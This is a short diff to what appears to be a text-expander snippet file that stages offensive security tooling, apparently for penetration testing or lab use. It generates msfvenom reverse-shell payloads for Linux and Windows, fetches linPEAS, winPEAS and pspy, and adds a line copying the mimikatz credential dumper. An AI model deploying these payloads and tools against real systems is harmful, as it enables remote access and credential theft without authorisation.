@@ -31,6 +31,7 @@ matches:
       msfvenom -p linux/x64/shell_reverse_tcp LHOST={{IP}} LPORT=22 -f elf -o shell64.elf &
       msfvenom -p windows/shell_reverse_tcp LHOST={{IP}} LPORT=22 -f exe -o shell86.exe &
       msfvenom -p windows/x64/shell_reverse_tcp LHOST={{IP}} LPORT=22 -f exe -o shell64.exe &
+      cp /usr/share/windows-resources/mimikatz/x64/mimikatz.exe . &
       wget -q https://github.com/carlospolop/PEASS-ng/releases/download/20230924-10138da9/linpeas.sh -O lp.sh & 
       wget -q https://github.com/carlospolop/PEASS-ng/releases/download/20230924-10138da9/winPEASany.exe -O wp.exe & 
       wget -q https://github.com/DominicBreuker/pspy/releases/download/v1.2.1/pspy64 &
